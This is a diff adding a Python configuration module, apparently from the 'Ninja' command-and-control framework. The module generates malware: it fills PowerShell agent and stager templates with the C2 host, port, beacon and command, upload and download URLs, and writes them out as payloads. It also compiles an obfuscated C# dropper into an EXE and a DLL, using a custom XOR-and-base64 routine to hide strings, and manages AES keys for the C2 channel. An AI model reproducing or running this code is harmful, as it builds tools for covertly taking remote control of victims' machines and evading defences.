@@ -1,0 +1,124 @@
+# Embedded file name: core\config.py
+from Encryption import generate_key
+import os, base64, random, codecs, glob, readline, re
+from Crypto import Random
+import subprocess
+import string
+import config
+PORT = '{PORT}'
+VERSION = '1.0.1'
+AGENTS = dict()
+COMMAND = dict()
+TIME = dict()
+COUNT = 0
+HOST='{IP}'
+BASE = 'Ninja'
+POINTER = 'main'
+PAYLOADS = []
+beacon='{beacon}'
+#AESKey="+4hOi8+xxOki+Mg9Y4+GuD7g7n2eytMa5KF6zNnaPz0="
+AESKey=base64.b64encode(bytearray("".join([random.choice(string.ascii_uppercase) for i in range(32)]), "UTF-8")).decode()
+
+{URL}
+"""
+raw_payload={raw}
+b52_payload={b52payload}
+b64_stager={b64stager}
+b52_stager={b52stager}
+hjf_payload={hjf}
+b64_payload={b64payload}
+hjfs_payload={hjfs}
+sct_payload={sct}
+hta_payload={hta}
+register_url={register}
+download_url={download}
+upload_url={upload}
+image_url={image}
+command_url={cmd}
+result_url={re}
+modules_url={md}
+"""
+#.replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload)
+
+
+
+def PAYLOAD():
+    global HOST
+    global PORT
+    fp = open('agents/payload2.ps1', 'r')
+    ps1 = fp.read()
+    ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}', command_url).replace('{re}', result_url).replace('{md}', modules_url)
+    payload= open('payloads/raw_payload.ps1', 'w')
+    payload.write(ps1)
+    payload.close()
+    return ps1
+
+def STAGER():
+    global HOST
+    global PORT
+    fp = open('agents/stager.ps1', 'r')
+    ps1 = fp.read()
+    ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{b64payload}', b64_payload)
+    payload= open('payloads/base64_stager.ps1', 'w')
+    payload.write(ps1)
+    payload.close()
+    return ps1
+
+def cspayload():
+    fp = open('agents/simple_dropper.ninja', 'r')
+    fpo= open('payloads/cs_dropper.cs', 'w')
+    cs = fp.read()
+    cs = cs.replace('{ip}', csobf(HOST)).replace('{port}', csobf(PORT)).replace('{b52_stager}', csobf(b52_stager)).replace('{http}', csobf("http://"))
+    fpo.write(cs)
+    fpo.close()
+    fp.close()
+    exe="mono-csc -r:lib/System.Management.Automation.dll payloads/cs_dropper.cs -out:payloads/dropper_cs.exe -target:exe -warn:2"
+    dll="mono-csc -r:lib/System.Management.Automation.dll payloads/cs_dropper.cs -out:payloads/dropper_cs.dll -target:library -warn:2"
+    try:
+        subprocess.check_output(dll, shell=True)
+        print "C# Dropper DLL written to: payloads/payload_cs.dll"
+    except Exception as e:
+        print '[-] ERROR generating csharp payload : %s' % str(e)
+    try:
+        subprocess.check_output(exe, shell=True)
+        print "C# Dropper EXE written to: payloads/dropper_cs.exe"
+    except Exception as e:
+        print '[-] ERROR generating csharp payload : %s' % str(e)
+
+def csobf(str):
+    d=""
+    for i in str:
+        d=d+chr((ord(i)+10)^50)
+    return base64.b64encode(d)
+
+def set_port(in_port):
+    global PORT
+    PORT = in_port
+
+
+def set_count(in_count):
+    global COUNT
+    COUNT = in_count
+
+
+def set_pointer(in_pointer):
+    global POINTER
+    POINTER = in_pointer
+
+
+def set_ip(in_ip):
+    global HOST
+    HOST = in_ip
+
+
+def set_time(id, in_time):
+    TIME[id] = in_time - TIME[id]
+
+def get_pointer():
+    global POINTER
+    return POINTER
+
+def set_key():
+    global AESKey
+    AESKey=generate_key()
+    print  AESKey
